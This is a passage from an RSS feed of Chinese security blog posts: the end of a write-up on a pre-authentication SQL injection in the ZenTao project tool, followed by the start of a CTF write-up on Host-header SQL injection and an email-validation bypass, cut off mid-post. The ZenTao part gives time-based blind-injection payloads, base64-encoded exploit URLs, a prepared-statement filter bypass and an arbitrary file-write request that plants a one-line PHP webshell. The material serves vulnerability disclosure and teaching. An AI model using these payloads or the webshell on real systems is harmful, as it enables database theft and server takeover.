    $orders = explode(&#39;,&#39;, $orders);
    foreach($orders as $i =&amp;gt; $order)
    {
        $orderParse = explode(&#39; &#39;, trim($order));
        foreach($orderParse as $key =&amp;gt; $value)
        {
            $value = trim($value);
            if(empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) continue;

            $field = $value;
            /* such as t1.id field. */
            if(strpos($value, &#39;.&#39;) !== false) list($table, $field) = explode(&#39;.&#39;, $field);
            if(strpos($field, &#39;`&#39;) === false) $field = &quot;`$field`&quot;;

            $orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field :  $field;
            unset($table);
        }
        $orders[$i] = join(&#39; &#39;, $orderParse);
        if(empty($orders[$i])) unset($orders[$i]);
    }
    $order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;

    $this-&amp;gt;sql .= &#39; &#39; . DAO::ORDERBY . &quot; $order&quot;;
    return $this;
}&lt;/code&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;后未做严格的过滤与判断，然后拼接到了&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;后面导致产生注入.&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;&lt;/code&gt;&lt;p&gt;看了一下&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;的修补是对limit进行正则限制，但是事实上感觉此处正则是写了一个bug，比如正常调用&lt;code class=&quot;inline&quot;&gt;orderBy($order)&lt;/code&gt;的时候，其中&lt;code class=&quot;inline&quot;&gt;$order&lt;/code&gt;为&lt;code class=&quot;inline&quot;&gt;abc desc limit 1,1&lt;/code&gt;的时候，进入&lt;code class=&quot;inline&quot;&gt;$limit&lt;/code&gt;则是&lt;code class=&quot;inline&quot;&gt;limit 1,1&lt;/code&gt;，导致匹配失败。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/* Add &quot;`&quot; in order string. */
/* When order has limit string. */
$pos    = stripos($order, &#39;limit&#39;);
$orders = $pos ? substr($order, 0, $pos) : $order;
$limit  = $pos ? substr($order, $pos) : &#39;&#39;;
if($limit and !preg_match(&#39;/^[0-9]+ *(, *[0-9]+)?$/&#39;, $limit)) $limit = &#39;&#39;;&lt;/code&gt;&lt;p&gt;如果想要造成前台注入（无需登录）的话，就得先看看禅道开放了哪些接口，看是否有调用&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数。&lt;/p&gt;&lt;p&gt;\zentao\module\common\model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function isOpenMethod($module, $method)
{
   if($module == &#39;user&#39; and strpos(&#39;login|logout|deny|reset&#39;, $method) !== false) return true;
   if($module == &#39;api&#39;  and $method == &#39;getsessionid&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;ping&#39;)  return true;
   if($module == &#39;misc&#39; and $method == &#39;checktable&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;qrcode&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;about&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;checkupdate&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;changelog&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;login&#39;)  return true;
   if($module == &#39;sso&#39; and $method == &#39;logout&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;bind&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;gettodolist&#39;) return true;
   if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;

   if($this-&amp;gt;loadModel(&#39;user&#39;)-&amp;gt;isLogon() or ($this-&amp;gt;app-&amp;gt;company-&amp;gt;guest and $this-&amp;gt;app-&amp;gt;user-&amp;gt;account == &#39;guest&#39;))
   {
       if(stripos($method, &#39;ajax&#39;) !== false) return true;
       if(stripos($method, &#39;downnotify&#39;) !== false) return true;
       if($module == &#39;tutorial&#39;) return true;
       if($module == &#39;block&#39;) return true;
       if($module == &#39;product&#39; and $method == &#39;showerrornone&#39;) return true;
   }
   return false;
}&lt;/code&gt;&lt;p&gt;其中的&lt;code class=&quot;inline&quot;&gt;if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;&lt;/code&gt;，也就是本次漏洞的主角，继续跟进。&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;class block extends control
{
    public function __construct($moduleName = &#39;&#39;, $methodName = &#39;&#39;)
    {
        parent::__construct($moduleName, $methodName);
        $this-&amp;gt;selfCall = strpos($this-&amp;gt;server-&amp;gt;http_referer, common::getSysURL()) === 0 || $this-&amp;gt;session-&amp;gt;blockModule;
        if($this-&amp;gt;methodName != &#39;admin&#39; and $this-&amp;gt;methodName != &#39;dashboard&#39; and !$this-&amp;gt;selfCall and !$this-&amp;gt;loadModel(&#39;sso&#39;)-&amp;gt;checkKey()) die(&#39;&#39;);
    }
    public function main($module = &#39;&#39;, $id = 0)
    {
        ...
       $mode = strtolower($this-&amp;gt;get-&amp;gt;mode);
       if($mode == &#39;getblocklist&#39;)
       {   
           ...
       }   
       elseif($mode == &#39;getblockform&#39;)
       {   
           ...
       }   
       elseif($mode == &#39;getblockdata&#39;)
       {
           $code = strtolower($this-&amp;gt;get-&amp;gt;blockid);
    
           $params = $this-&amp;gt;get-&amp;gt;param;
           $params = json_decode(base64_decode($params));
            ....
           $this-&amp;gt;viewType    = (isset($params-&amp;gt;viewType) and $params-&amp;gt;viewType == &#39;json&#39;) ? &#39;json&#39; : &#39;html&#39;;
           $this-&amp;gt;params      = $params;
           $this-&amp;gt;view-&amp;gt;code  = $this-&amp;gt;get-&amp;gt;blockid;
           $this-&amp;gt;view-&amp;gt;title = $this-&amp;gt;get-&amp;gt;blockTitle;
    
           $func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;
           if(method_exists(&#39;block&#39;, $func))
           {
               $this-&amp;gt;$func($module);
           }
           else
           {
               $this-&amp;gt;view-&amp;gt;data = $this-&amp;gt;block-&amp;gt;$func($module, $params);
           }
       }
    }
}&lt;/code&gt;&lt;p&gt;首先看&lt;code class=&quot;inline&quot;&gt;__construct&lt;/code&gt;中，&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;selfCall&lt;/code&gt;是在验证&lt;code class=&quot;inline&quot;&gt;referer&lt;/code&gt;的值，如果为真的话则后面的&lt;code class=&quot;inline&quot;&gt;if&lt;/code&gt;将不会进入&lt;code class=&quot;inline&quot;&gt;die&lt;/code&gt;语句里面&lt;/p&gt;&lt;p&gt;接下来跟进&lt;code class=&quot;inline&quot;&gt;main&lt;/code&gt;函数，可以看到最后的&lt;code class=&quot;inline&quot;&gt;$func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;&lt;/code&gt;，会对一些函数进行调用，与此同时，我们搜索&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;的调用的时候可以发现&lt;code class=&quot;inline&quot;&gt;printCaseBlock&lt;/code&gt;函数的存在&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-dc18e0f1b6d8b747c6ec554acae5d139_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2246&quot;&gt;&lt;p&gt;所以前台注入的整个过程便比较清晰了，那么如何利用?&lt;/p&gt;&lt;h2&gt;&lt;b&gt;SQL注入利用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回过头来，因为禅道有windows直接的一键化安装程序，其数据库使用的也是&lt;code class=&quot;inline&quot;&gt;root&lt;/code&gt;权限，导致可直接导出shell，但是如果没有这么高权限的时候，对于这个注入应该如何出数据。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &#39;select user()&#39;
param = &#39;{&quot;orderBy&quot;:&quot;order limit 1;select (if(ord(mid((%s),%d,1))=%d,sleep(2),1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) ,1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) &lt;/code&gt;&lt;p&gt;禅道是支持多语句的，这也为后面的利用提供方便。&lt;/p&gt;&lt;p&gt;注入出数据库名和表段名后，当我想继续注入出用户账号密码的时候，意外地发现没有出数据。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;sql = &#39;select 12345 from zt_user&#39;&lt;/code&gt;&lt;p&gt;还是没有出数据，猜测是管理员改了表前缀，所以想去通过&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;查询一下表名，但是意外地发现，也不能读取？难道被删了？但是我还是想知道一下表前缀。&lt;/p&gt;&lt;p&gt;请求的时候加了一个单引号，并且加上referer，看一下报错信息。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxJyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=

其中param经过BASE64解码得到
{&quot;orderBy&quot;:&quot;order limit 1,1&#39;&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2b635f910bb80ada4553155d1c748f29_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2710&quot;&gt;&lt;p&gt;因为PDO的关系，SQL中的表名是&lt;code class=&quot;inline&quot;&gt;%s&lt;/code&gt;替代的，所以未能够得到库名。&lt;/p&gt;&lt;p&gt;那么就利用报错去得到当前SQl语句里面查询的表名，比如利用&lt;code class=&quot;inline&quot;&gt;polygon&lt;/code&gt;函数。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-adbcf88a750df6340c76cb8c7da63235_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2696&quot;&gt;&lt;p&gt;此注入点可以理解为limit后的注入点，因为使用多语句的话，报错效果不明显，所以就直接在limit后面进行注入。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=

param base64解码
{&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-56760516eb1da1fa547b876b9838bd67_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2544&quot;&gt;&lt;p&gt;上图为本地测试，但是limit的注入和mysql版本还有一些关系，目前网上的payload仅限于低版本才可报错注入出数据，很不幸运的是，目标使用的是高版本mysql。&lt;/p&gt;&lt;p&gt;那既然可以多语句，在不能用&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;的情况下，可以通过下面语法来进行盲注：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;show table status where name = &#39;xxx&#39; and sleep(2)&lt;/code&gt;&lt;p&gt;写到py里面的payload是这样的&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &quot;show table status where hex(substr(name,1,8))=&#39;7a745f75736572%s&#39; and sleep(2)&quot; % binascii.b2a_hex(chr(i))
param = &#39;{&quot;orderBy&quot;:&quot;order limit 1,1;%s--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % sql&lt;/code&gt;&lt;p&gt;经过一番折腾发现，表前缀就是默认的&lt;code class=&quot;inline&quot;&gt;zt_&lt;/code&gt;，但是为啥又不能够读取到用户数据呢?&lt;/p&gt;&lt;p&gt;仔细看到禅道里面的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数，发现做了过滤。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);&lt;/code&gt;&lt;p&gt;把下划线给过滤掉了，那这种在多语句下，可以利用mysql的预查询来绕过，值得注意的是，这个版本语法大小写敏感。&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;&lt;/code&gt;&lt;p&gt;注入出admin密码的时候，惊喜地发现不能解开，无奈之下，只能先拿到一个普通账号。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Getshell&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;禅道在防止getshell方面还花了一点心思，曾经挖到一个可以任意写文件getshell（最新版本还存在这段代码），不过需要的权限是管理员权限。&lt;/p&gt;&lt;p&gt;看了一下禅道里面人员组织架构情况，有研发、项目经理、产品经理，高层管理，系统管理员等角色，其中系统管理员虽然密码解不开，但是我们可以去解密一下高层管理的密码，因为这个角色的权限是可以修改某用户的用户组权限。在高层管理账号中，我们可以将一个普通账号修改为管理员。&lt;/p&gt;&lt;p&gt;接下来就是写文件Getshell：&lt;/p&gt;&lt;p&gt;/xampp/zentaopro/module/api/control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function getModel($moduleName, $methodName, $params = &#39;&#39;)
{
    parse_str(str_replace(&#39;,&#39;, &#39;&amp;amp;&#39;, $params), $params);
    $module = $this-&amp;gt;loadModel($moduleName);
    
    $result = call_user_func_array(array(&amp;amp;$module, $methodName), $params);
    if(dao::isError()) die(json_encode(dao::getError()));
    $output[&#39;status&#39;] = $result ? &#39;success&#39; : &#39;fail&#39;;
    $output[&#39;data&#39;]   = json_encode($result);
    $output[&#39;md5&#39;]    = md5($output[&#39;data&#39;]);
    $this-&amp;gt;output     = json_encode($output);
    die($this-&amp;gt;output);
}&lt;/code&gt;&lt;p&gt;可以看到是进入了call_user_func_array，也就是我们可以任意实例化一个module方法，方法的参数也是可控的，可以通过&lt;code class=&quot;inline&quot;&gt;,&lt;/code&gt;来分割参数。&lt;/p&gt;&lt;p&gt;/zentaopro/module/editor/model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function save($filePath)
{
    $fileContent = $this-&amp;gt;post-&amp;gt;fileContent;
    $evils       = array(&#39;eval&#39;, &#39;exec&#39;, &#39;passthru&#39;, &#39;proc_open&#39;, &#39;shell_exec&#39;, &#39;system&#39;, &#39;$$&#39;, &#39;include&#39;, &#39;require&#39;, &#39;assert&#39;);
    $gibbedEvils = array(&#39;e v a l&#39;, &#39;e x e c&#39;, &#39; p a s s t h r u&#39;, &#39; p r o c _ o p e n&#39;, &#39;s h e l l _ e x e c&#39;, &#39;s y s t e m&#39;, &#39;$ $&#39;, &#39;i n c l u d e&#39;, &#39;r e q u i r e&#39;, &#39;a s s e r t&#39;);
    $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent);
    if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent);

    $dirPath = dirname($filePath);
    $extFilePath = substr($filePath, 0, strpos($filePath, DS . &#39;ext&#39; . DS) + 4);
    if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true);
    if(is_writable($dirPath))
    {
        file_put_contents($filePath, $fileContent);
    }
    else
    {
        die(js::alert($this-&amp;gt;lang-&amp;gt;editor-&amp;gt;notWritable . $extFilePath));
    }
}&lt;/code&gt;&lt;p&gt;在editor中是可以写一个文件的，filePath可控，fileContent也是可控的，这下就是可以任意写一个文件。&lt;/p&gt;&lt;p&gt;Exp:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/?m=api&amp;amp;f=getModel&amp;amp;moduleName=editor&amp;amp;methodName=save&amp;amp;params=filePath=aaaaaa.php

POST内容:
fileContent=&amp;lt;?php $_POST[1]($_POST[2]);

最后的shell地址是\zentaopro\module\api\aaaaaa.php&lt;/code&gt;&lt;p&gt;但是问题又来了，前面报错里面得到的路径目录感觉像是做了权限（这里绕弯了，路径少加了一个www，所以以为是没权限写），最终从数据库中的&lt;code class=&quot;inline&quot;&gt;zt_file&lt;/code&gt;获取上传文件的路径，然后再将shell写入当中才得以结束。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;的漏洞如何进行防御的时候，我觉得上面代码在部分上有可取之处。&lt;/p&gt;&lt;p&gt;1、去掉&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;部分，然后限制格式&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);&lt;/code&gt;&lt;p&gt;2、然后循环对每个字段进行反引号的添加&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$orders = explode(&#39;,&#39;, $orders);
foreach ($orders as $i =&amp;gt; $order) {
	$orderParse = explode(&#39; &#39;, trim($order));
	foreach ($orderParse as $key =&amp;gt; $value) {
		$value = trim($value);
		if (empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) {
			continue;
		}

		$field = $value;
		/* such as t1.id field. */
		if (strpos($value, &#39;.&#39;) !== false) {
			list($table, $field) = explode(&#39;.&#39;, $field);
		}

		if (strpos($field, &#39;`&#39;) === false) {
			$field = &quot;`$field`&quot;;
		}

		$orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field : $field;
		unset($table);
	}
	$orders[$i] = join(&#39; &#39;, $orderParse);
	if (empty($orders[$i])) {
		unset($orders[$i]);
	}

}&lt;/code&gt;&lt;p&gt;整个过程就是自己在挖莫名其妙的坑，然后再一个个慢慢补上，希望能够对大家有用。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-03-07-34275981</guid>
<pubDate>Wed, 07 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>攻击LNMP架构Web应用的几个小Tricks</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-02-22-33919193.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33919193&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bc88b00f982a8df093427c8b8ea7e535_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt; &lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;农历新年初一，我在&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html&quot;&gt;代码审计知识星球&lt;/a&gt;分享了一个红包，但领取红包的条件是破解我出的一道代码审计相关题目，题干如下：&lt;/p&gt;&lt;blockquote&gt;&lt;a href=&quot;http://2018.mhz.pw:62231&quot;&gt;2018.mhz.pw:62231&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01  拉取源码&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;题干比较简单，我们用浏览器打开，发现提示&lt;code class=&quot;inline&quot;&gt;ERR_INVALID_HTTP_RESPONSE&lt;/code&gt;，说明这个端口并非HTTP服务。用nmap进行端口指纹识别：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;nmap -sV -p 62231 2018.mhz.pw&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2fd8d5219cac4c784a0e26ffe4df8048_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;213&quot;&gt;&lt;p&gt;可见，这是一个rsync服务，我们使用rsync命令查看目录，发现只有一个目录，名为&lt;code class=&quot;inline&quot;&gt;pwnhub_6670.git&lt;/code&gt;，将其拉取下来：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a11e4589088c3480df25b50cac8ca294_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;367&quot;&gt;&lt;p&gt;查看&lt;code class=&quot;inline&quot;&gt;pwnhub_6670.git&lt;/code&gt;目录，发现这是一个git裸仓库（&lt;a href=&quot;http://www.saintsjd.com/2011/01/what-is-a-bare-git-repository/&quot;&gt;git bare repository&lt;/a&gt;）。&lt;/p&gt;&lt;p&gt;Git裸仓库怎么还原呢？其实非常简单，我们平时用的Github、Gitlab上存的所有仓库其实都是裸仓库，比如我们拉取vulhub的源码，执行&lt;code class=&quot;inline&quot;&gt;git clone https://github.com/vulhub/vulhub.git&lt;/code&gt;，其中&lt;code class=&quot;inline&quot;&gt;vulhub.git&lt;/code&gt;其实就是Github服务器上的一个裸仓库。可见，裸仓库一般以”项目名称.git“为名。&lt;/p&gt;&lt;p&gt;Git支持通过本地文件、SSH、HTTPS或GIT协议拉取信息。我们既然已经用rsync将裸仓库下载到本地了，所以只需要&lt;code class=&quot;inline&quot;&gt;git clone pwnhub_6670.git&lt;/code&gt;即可将裸仓库拉取下来，成为一个标准的仓库：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e9119014ab77117e4fdadc453c307251_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;405&quot;&gt;&lt;p&gt;仓库&lt;code class=&quot;inline&quot;&gt;pwnhub_6670&lt;/code&gt;文件夹下的内容就是我们需要审计的源代码。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02  SQL注入漏洞挖掘&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;作为一个出题人，我耍了点小阳谋。我用了一个叫&lt;a href=&quot;https://github.com/SpeedPHP/speed&quot;&gt;speed&lt;/a&gt;的小众PHP框架，但改了核心文件名为&lt;code class=&quot;inline&quot;&gt;core.php&lt;/code&gt;。就是为了防止大家去找这个框架本身的漏洞导致走偏方向，所有有漏洞的代码都出在我写的代码中。&lt;/p&gt;&lt;p&gt;拿到源码仓库，第一步先看看&lt;code class=&quot;inline&quot;&gt;git log&lt;/code&gt;和branch、tags等信息，也许会暴漏一些目标的敏感信息。这里没有，于是我们就应该把目标放向代码本身。&lt;/p&gt;&lt;p&gt;目标网站&lt;code class=&quot;inline&quot;&gt;http://2018.mhz.pw&lt;/code&gt;只有简单的注册、登录功能，有关输入的代码如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
escape($_REQUEST);
escape($_POST);
escape($_GET);

function escape(&amp;amp;$arg) {
    if(is_array($arg)) {
        foreach ($arg as &amp;amp;$value) {
            escape($value);
        }
    } else {
        $arg = str_replace([&quot;&#39;&quot;, &#39;\\&#39;, &#39;(&#39;, &#39;)&#39;], [&quot;‘&quot;, &#39;\\\\&#39;, &#39;（&#39;, &#39;）&#39;], $arg);
    }
}

function arg($name, $default = null, $trim = false) {
    if (isset($_REQUEST[$name])) {
        $arg = $_REQUEST[$name];
    } elseif (isset($_SERVER[$name])) {
        $arg = $_SERVER[$name];
    } else {
        $arg = $default;
    }
    if($trim) {
        $arg = trim($arg);
    }
    return $arg;
}&lt;/code&gt;&lt;p&gt;escape是将GPR中的单引号、圆括号转换成中文符号，反斜线进行转义；arg是获取用户输入的&lt;code class=&quot;inline&quot;&gt;$_REQUEST&lt;/code&gt;或&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;。显然，这里&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;变量没有经过转义，先记下这个点。&lt;/p&gt;&lt;p&gt;全局没其他值得注意的地方了，所以开始看controller的代码。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
function actionRegister(){
    if ($_POST) {
        $username = arg(&#39;username&#39;);
        $password = arg(&#39;password&#39;);

        if (empty($username) || empty($password)) {
            $this-&amp;gt;error(&#39;Username or password is empty.&#39;);
        }

        $email = arg(&#39;email&#39;);
        if (empty($email)) {
            $email = $username . &#39;@&#39; . arg(&#39;HTTP_HOST&#39;);
        }

        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $this-&amp;gt;error(&#39;Email error.&#39;);
        }

        $user = new User();
        $data = $user-&amp;gt;query(&quot;SELECT * FROM `{$user-&amp;gt;table_name}` WHERE `username` = &#39;{$username}&#39;&quot;);
        if ($data) {
            $this-&amp;gt;error(&#39;This username is exists.&#39;);
        }

        $ret = $user-&amp;gt;create([
            &#39;username&#39; =&amp;gt; $username,
            &#39;password&#39; =&amp;gt; md5($password),
            &#39;email&#39; =&amp;gt; $email
        ]);
        if ($ret) {
            $_SESSION[&#39;user_id&#39;] = $user-&amp;gt;lastInsertId();
        } else {
            $this-&amp;gt;error(&#39;Unknown error.&#39;);
        }
    }

}&lt;/code&gt;&lt;p&gt;以上是注册功能的代码，比较简单。用户名和密码是必填项，邮箱如果没有填写，则自动设置为”用户名@网站域名“。最后将三者传入create方法，create方法其实就是拼接了一个INSERT语句。&lt;/p&gt;&lt;p&gt;值得注意的是，网站域名是从&lt;code class=&quot;inline&quot;&gt;arg(&#39;HTTP_HOST&#39;)&lt;/code&gt;中获取，也就是从&lt;code class=&quot;inline&quot;&gt;$_REQUEST&lt;/code&gt;或&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;中获取。因为&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;没有经过转义，我们只需要在HTTP头Host值中引入单引号，即可造成一个SQL注入漏洞。&lt;/p&gt;&lt;p&gt;但email变量经过了&lt;code class=&quot;inline&quot;&gt;filter_var($email, FILTER_VALIDATE_EMAIL)&lt;/code&gt;的检测，我们首先要绕过之。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03  FILTER_VALIDATE_EMAIL 绕过 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这就是今天第一个trick。这个点早在当初PHPMailer的&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html&quot;&gt;CVE-2016-10033&lt;/a&gt;就提到过。&lt;/p&gt;&lt;p&gt;RFC 3696规定，邮箱地址分为local part和domain part两部分。local part中包含特殊字符，需要如下处理：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;将特殊字符用&lt;code class=&quot;inline&quot;&gt;\&lt;/code&gt;转义，如&lt;code class=&quot;inline&quot;&gt;Joe\&#39;Blow@example.com&lt;/code&gt;&lt;/li&gt;&lt;li&gt;或将local part包裹在双引号中，如&lt;code class=&quot;inline&quot;&gt;&quot;Joe&#39;Blow&quot;@example.com&lt;/code&gt;&lt;/li&gt;&lt;li&gt;local part长度不超过64个字符&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;虽然PHP没有完全按照RFC 3696进行检测，但支持上述第2种写法。所以，我们可以利用之绕过&lt;code class=&quot;inline&quot;&gt;FILTER_VALIDATE_EMAIL&lt;/code&gt;的检测。&lt;/p&gt;&lt;p&gt;因为代码中邮箱是用户名、@、Host三者拼接而成，但用户名是经过了转义的，所以单引号只能放在Host中。我们可以传入用户名为&lt;code class=&quot;inline&quot;&gt;&quot;&lt;/code&gt;，Host为&lt;code class=&quot;inline&quot;&gt;aaa&#39;&quot;@example.com&lt;/code&gt;，最后拼接出来的邮箱为&lt;code class=&quot;inline&quot;&gt;&quot;@aaa&#39;&quot;@example.com&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;这个邮箱是合法的：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2c3ebaa43d148bcb1077ef794875179a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;374&quot;&gt;&lt;p&gt;这个邮箱包含单引号，将闭合SQL语句中原本的单引号，造成SQL注入漏洞。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04  绕过 Nginx Host 限制&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这是今天第二个trick。&lt;/p&gt;&lt;p&gt;我们尝试向目标注册页面发送刚才构造好的用户名和Host：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-036f8b0da6617ec28407606900723755_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; 